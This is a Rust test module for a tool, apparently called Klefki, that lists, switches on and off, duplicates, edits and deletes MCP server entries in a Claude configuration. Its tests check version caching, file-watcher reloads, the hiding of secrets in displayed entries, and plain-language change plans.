    fn the_cli_version_is_asked_once_not_on_every_refresh() {
        let env = checkable_env(&two_projects("end"));
        let core = env.start();
        collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::CliVersion(Some(_))))
                && final_status(e, "gw").is_some()
        });
        for _ in 0..3 {
            core.send(Command::Refresh { live_all: false });
            collect(&core, |e| {
                e.iter().any(|x| matches!(x, Event::CliVersion(Some(_))))
            });
        }
        assert_eq!(env.runs(&["--version"]), 1);
    }

    #[test]
    fn a_failed_version_ask_is_tried_again_on_the_next_refresh() {
        // A first run can fail for reasons that pass (a virus scan on first start, a timeout); it is not an answer.
        let env = Env::new(
            &two_projects("end"),
            r#"{"rules":[{"args":["--version"],"exit_code":1}]}"#,
            &[],
        );
        let core = env.start();
        collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::CliVersion(None)))
        });
        core.send(Command::Refresh { live_all: false });
        collect(&core, |_| env.runs(&["--version"]) == 2);
    }

    /// `gw` (user) and `loc` (local, in a project folder that exists), both checkable. Returns the project key.
    fn checkable_with_project(loc_off: bool) -> (Env, String) {
        let env = checkable_env(&serde_json::json!({}));
        let project = env.dir.path().join("proj");
        std::fs::create_dir_all(&project).unwrap();
        let key = project.to_string_lossy().replace('\\', "/");
        let disabled: Vec<&str> = if loc_off { vec!["loc"] } else { vec![] };
        write_config(
            &env,
            &serde_json::json!({
                "mcpServers": {"gw": {"type": "stdio", "command": "node"}},
                "projects": {key.clone(): {
                    "mcpServers": {"loc": {"type": "stdio", "command": "x"}},
                    "disabledMcpServers": disabled
                }}
            }),
        );
        let key = inventory::normalise_project(&key);
        (env, key)
    }

    #[test]
    fn saving_a_change_neither_re_checks_servers_nor_asks_the_version_again() {
        let (env, key) = checkable_with_project(false);
        let core = env.start();
        collect(&core, |e| {
            final_status(e, "gw") == Some(Status::Connected)
                && final_status(e, "loc") == Some(Status::Connected)
        });
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", &key),
                enabled: false,
            }],
        );
        core.send(Command::Apply(plan.id));
        collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Applied { .. }))
        });
        // Give a stray check time to start, if one were queued.
        std::thread::sleep(Duration::from_millis(400));
        assert_eq!(env.runs(&["mcp", "get", "gw"]), 1, "gw did not change");
        assert_eq!(env.runs(&["mcp", "get", "loc"]), 1, "loc was switched off");
        assert_eq!(env.runs(&["--version"]), 1);
    }

    #[test]
    fn a_server_switched_on_by_a_change_is_checked() {
        let (env, key) = checkable_with_project(true);
        let core = env.start();
        collect(&core, |e| final_status(e, "gw") == Some(Status::Connected));
        assert_eq!(
            env.runs(&["mcp", "get", "loc"]),
            0,
            "off servers are not checked"
        );
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", &key),
                enabled: true,
            }],
        );
        core.send(Command::Apply(plan.id));
        collect(&core, |e| final_status(e, "loc") == Some(Status::Connected));
        assert_eq!(env.runs(&["mcp", "get", "loc"]), 1);
        assert_eq!(env.runs(&["mcp", "get", "gw"]), 1);
        assert_eq!(env.runs(&["--version"]), 1);
    }

    // ---- the file watcher

    fn snapshots(events: &[Event]) -> Vec<&Snapshot> {
        events
            .iter()
            .filter_map(|e| match e {
                Event::Snapshot(s) => Some(&**s),
                _ => None,
            })
            .collect()
    }

    #[test]
    fn a_server_added_from_outside_appears_without_a_refresh() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        collect(&core, |e| !snapshots(e).is_empty());
        let mut changed = two_projects("end");
        changed["mcpServers"]["added"] =
            serde_json::json!({"type": "http", "url": "https://x.example/mcp"});
        write_config(&env, &changed);
        collect(&core, |e| {
            snapshots(e)
                .iter()
                .any(|s| s.servers.iter().any(|r| r.name == "added"))
        });
    }

    #[test]
    fn a_new_mcp_json_in_a_known_project_appears_without_a_refresh() {
        let env = quiet_env(&serde_json::json!({}));
        let repo = env.dir.path().join("repo");
        std::fs::create_dir_all(&repo).unwrap();
        let key = repo.to_string_lossy().replace('\\', "/");
        write_config(&env, &serde_json::json!({"projects": {key: {}}}));
        let core = env.start();
        collect(&core, |e| !snapshots(e).is_empty());
        std::fs::write(repo.join(".mcp.json"), MCP_JSON).unwrap();
        collect(&core, |e| {
            snapshots(e).iter().any(|s| {
                s.servers
                    .iter()
                    .any(|r| r.name == "ps" && r.scope == Scope::Project)
            })
        });
    }

    #[test]
    fn klefki_s_own_save_is_read_once_not_again_by_the_watcher() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        collect(&core, |e| !snapshots(e).is_empty());
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: local_id("loc", "/work/a"),
                enabled: false,
            }],
        );
        core.send(Command::Apply(plan.id));
        let mut events = collect(&core, |e| {
            e.iter().any(|x| matches!(x, Event::Applied { .. }))
        });
        // Several watch intervals and the settle time pass.
        std::thread::sleep(Duration::from_millis(600));
        while let Some(e) = core.try_recv() {
            events.push(e);
        }
        assert_eq!(snapshots(&events).len(), 1, "one reload after the save");
    }

    #[test]
    fn nothing_is_read_again_while_nothing_changes() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        collect(&core, |e| !snapshots(e).is_empty());
        std::thread::sleep(Duration::from_millis(600));
        let mut later = Vec::new();
        while let Some(e) = core.try_recv() {
            later.push(e);
        }
        assert!(snapshots(&later).is_empty(), "{later:#?}");
    }

    // ---- delete and edit

    fn entry_of(core: &Core, id: ServerId) -> (Result<String, String>, bool) {
        core.send(Command::Inspect(id.clone()));
        let events = collect(core, |e| e.iter().any(|x| matches!(x, Event::Entry { .. })));
        events
            .into_iter()
            .find_map(|e| match e {
                Event::Entry {
                    id: got,
                    json,
                    editable,
                } if got == id => Some((json, editable)),
                _ => None,
            })
            .unwrap()
    }

    fn plan_failure(core: &Core, changes: Vec<Change>) -> String {
        core.send(Command::Prepare(changes));
        let events = collect(core, |e| {
            e.iter()
                .any(|x| matches!(x, Event::PlanFailed(_) | Event::PlanReady(_)))
        });
        events
            .into_iter()
            .find_map(|e| match e {
                Event::PlanFailed(m) => Some(m),
                _ => None,
            })
            .expect("the plan was refused")
    }

    #[test]
    fn a_definition_is_shown_with_secrets_hidden() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let (json, editable) = entry_of(&core, user_id("gw"));
        let json = json.unwrap();
        assert!(editable);
        assert!(
            json.contains("<hidden>") && !json.contains("s3cret-value"),
            "{json}"
        );
        assert!(json.contains("\"command\": \"node\""), "{json}");
        let (gone, _) = entry_of(&core, user_id("ghost"));
        assert!(gone.is_err());
    }

    #[test]
    fn a_project_server_is_shown_but_not_editable() {
        let (env, key, _repo) = repo_env(serde_json::json!({}));
        let core = env.start();
        let (json, editable) = entry_of(&core, project_id(&key, "ps"));
        assert!(!editable);
        assert!(json.unwrap().contains("server.js"));
        let refused = plan_failure(
            &core,
            vec![Change::Delete {
                id: project_id(&key, "ps"),
            }],
        );
        assert!(refused.contains("repository"), "{refused}");
        let refused = plan_failure(
            &core,
            vec![Change::Replace {
                id: project_id(&key, "ps"),
                json: "{\"command\": \"x\"}".into(),
            }],
        );
        assert!(refused.contains("repository"), "{refused}");
    }

    #[test]
    fn deleting_a_user_server_removes_it_and_only_it() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(&core, vec![Change::Delete { id: user_id("gw") }]);
        assert!(
            plan.files[0].lines.contains(&"- gw".to_owned()),
            "{:?}",
            plan.files
        );
        assert!(plan.warnings.iter().any(|w| w.contains("sign-in")));
        let events = apply_and_wait(&core, &plan);
        assert!(
            events
                .iter()
                .any(|e| matches!(e, Event::Applied { changed: true, .. }))
        );
        let now = config_json(&env);
        assert_eq!(now["mcpServers"], serde_json::json!({}));
        assert_eq!(now["projects"], two_projects("end")["projects"]);
        assert!(
            snapshots(&events)
                .last()
                .unwrap()
                .servers
                .iter()
                .all(|r| r.name != "gw")
        );
        verify_passes(&core);
    }

    fn duplicate(id: ServerId, name: &str, targets: Vec<Target>) -> Change {
        Change::Duplicate {
            id,
            name: name.to_owned(),
            targets,
        }
    }

    #[test]
    fn duplicating_a_user_server_into_projects_copies_it_secrets_and_all() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![duplicate(
                user_id("gw"),
                "gw_copy",
                vec![
                    Target::Local("/work/a".into()),
                    Target::Local("/work/b".into()),
                ],
            )],
        );
        assert_eq!(plan.summary, ["Duplicate gw as gw_copy in a and b"]);
        assert_eq!(plan.action, "Duplicate");
        assert!(!plan.destructive);
        let shown = format!("{plan:?}");
        assert!(!shown.contains("s3cret-value"), "{shown}");
        assert!(shown.contains("+ gw_copy"), "{shown}");
        let events = apply_and_wait(&core, &plan);
        assert!(
            events
                .iter()
                .any(|e| matches!(e, Event::Applied { changed: true, .. }))
        );
        let now = config_json(&env);
        let gw = two_projects("end")["mcpServers"]["gw"].clone();
        assert_eq!(now["projects"]["/work/a"]["mcpServers"]["gw_copy"], gw);
        assert_eq!(now["projects"]["/work/b"]["mcpServers"]["gw_copy"], gw);
        assert_eq!(now["mcpServers"], two_projects("end")["mcpServers"]);
        let rows = &snapshots(&events).last().unwrap().servers;
        assert_eq!(rows.iter().filter(|r| r.name == "gw_copy").count(), 2);
        verify_passes(&core);
    }

    #[test]
    fn duplicating_a_local_server_to_the_user_and_its_own_project() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![duplicate(
                local_id("loc", "/work/a"),
                "loc2",
                vec![Target::User, Target::Local("/work/a".into())],
            )],
        );
        assert_eq!(
            plan.summary,
            ["Duplicate loc as loc2 for the user and in a"]
        );
        apply_and_wait(&core, &plan);
        let now = config_json(&env);
        let loc = serde_json::json!({"type": "stdio", "command": "x"});
        assert_eq!(now["mcpServers"]["loc2"], loc);
        assert_eq!(now["projects"]["/work/a"]["mcpServers"]["loc2"], loc);
        assert_eq!(now["projects"]["/work/a"]["mcpServers"]["loc"], loc);
    }

    #[test]
    fn a_copy_under_a_name_used_elsewhere_warns_which_one_claude_uses() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        // A user server called loc: in /work/a the local loc wins.
        let plan = plan_for(
            &core,
            vec![duplicate(
                local_id("loc", "/work/a"),
                "loc",
                vec![Target::User],
            )],
        );
        assert!(
            plan.warnings
                .iter()
                .any(|w| w.contains("local") && w.contains("a")),
            "{:?}",
            plan.warnings
        );
    }

    #[test]
    fn duplicates_that_cannot_be_made_say_why() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        for (change, why) in [
            (
                duplicate(user_id("gw"), "gw", vec![Target::User]),
                "already",
            ),
            (
                duplicate(user_id("gw"), "loc", vec![Target::Local("/work/a".into())]),
                "already",
            ),
            (
                duplicate(user_id("gw"), "bad name", vec![Target::User]),
                "name",
            ),
            (duplicate(user_id("gw"), "-x", vec![Target::User]), "name"),
            (duplicate(user_id("gw"), "ok", vec![]), "where"),
            (
                duplicate(
                    user_id("gw"),
                    "ok",
                    vec![Target::Local("/elsewhere".into())],
                ),
                "project",
            ),
            (
                duplicate(user_id("ghost"), "ok", vec![Target::User]),
                "no longer",
            ),
        ] {
            let refused = plan_failure(&core, vec![change.clone()]);
            assert!(refused.contains(why), "{change:?}: {refused}");
        }
        assert_eq!(config_json(&env), two_projects("end"));
    }

    #[test]
    fn a_project_server_is_not_duplicated_yet() {
        let (env, key, _repo) = repo_env(serde_json::json!({}));
        let core = env.start();
        let refused = plan_failure(
            &core,
            vec![duplicate(project_id(&key, "ps"), "ps2", vec![Target::User])],
        );
        assert!(refused.contains(".mcp.json"), "{refused}");
    }

    #[test]
    fn deleting_a_local_server() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![Change::Delete {
                id: local_id("loc", "/work/a"),
            }],
        );
        apply_and_wait(&core, &plan);
        assert_eq!(
            config_json(&env)["projects"]["/work/a"]["mcpServers"],
            serde_json::json!({})
        );
        verify_passes(&core);
    }

    #[test]
    fn editing_round_trips_through_the_hidden_view_and_keeps_the_secret() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let (json, _) = entry_of(&core, user_id("gw"));
        let edited = json.unwrap().replace("\"node\"", "\"node22\"");
        let plan = plan_for(
            &core,
            vec![Change::Replace {
                id: user_id("gw"),
                json: edited,
            }],
        );
        let shown = format!("{plan:?}");
        assert!(
            shown.contains("node22") && !shown.contains("s3cret-value"),
            "{shown}"
        );
        apply_and_wait(&core, &plan);
        let now = config_json(&env);
        assert_eq!(now["mcpServers"]["gw"]["command"], "node22");
        assert_eq!(now["mcpServers"]["gw"]["env"]["TOKEN"], "s3cret-value");
    }

    #[test]
    fn an_edit_that_is_not_valid_says_why_and_writes_nothing() {
        let env = quiet_env(&two_projects("end"));
        let before = config_json(&env);
        let core = env.start();
        for (json, why) in [
            ("{not json", "not valid JSON"),
            ("{\"type\": \"http\"}", "url"),
            (
                "{\"command\": \"x\", \"env\": {\"NEW\": \"<hidden>\"}}",
                "no value before",
            ),
        ] {
            let refused = plan_failure(
                &core,
                vec![Change::Replace {
                    id: user_id("gw"),
                    json: json.into(),
                }],
            );
            assert!(refused.contains(why), "{json}: {refused}");
        }
        assert_eq!(config_json(&env), before);
    }

    // ---- plain-language plans

    #[test]
    fn a_plan_says_in_words_what_it_does_and_what_the_button_does() {
        let env = quiet_env(&two_projects("end"));
        let core = env.start();
        let off = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: user_id("gw"),
                enabled: false,
            }],
        );
        assert_eq!(off.summary, ["Turn off gw in 2 projects"]);
        assert_eq!(off.action, "Turn off");
        assert!(!off.destructive);
        assert!(
            off.notes.iter().any(|n| n.contains("restart")),
            "{:?}",
            off.notes
        );
        assert!(
            !off.warnings.iter().any(|w| w.contains("restart")),
            "the restart hint is a note"
        );
        let delete = plan_for(
            &core,
            vec![Change::Delete {
                id: local_id("loc", "/work/a"),
            }],
        );
        assert_eq!(delete.summary, ["Delete loc in a"]);
        assert_eq!(delete.action, "Delete");
        assert!(delete.destructive);
        let mixed = plan_for(
            &core,
            vec![
                Change::SetEnabled {
                    id: local_id("loc", "/work/a"),
                    enabled: false,
                },
                Change::Delete { id: user_id("gw") },
            ],
        );
        assert_eq!(mixed.action, "Apply");
        assert_eq!(
            mixed.summary,
            ["Turn off loc in a", "Delete gw (user server)"]
        );
    }

    #[test]
    fn one_project_is_one_project() {
        let env = quiet_env(&serde_json::json!({
            "mcpServers": {"gw": {"type": "stdio", "command": "x"}},
            "projects": {"/work/only": {}}
        }));
        let core = env.start();
        let plan = plan_for(
            &core,
            vec![Change::SetEnabled {
                id: user_id("gw"),
                enabled: false,
            }],
        );
        assert_eq!(plan.summary, ["Turn off gw in 1 project"]);
        assert!(
            plan.warnings
                .iter()
                .any(|w| w.contains("the 1 project it knows")),
            "{:?}",
            plan.warnings
        );
    }
}
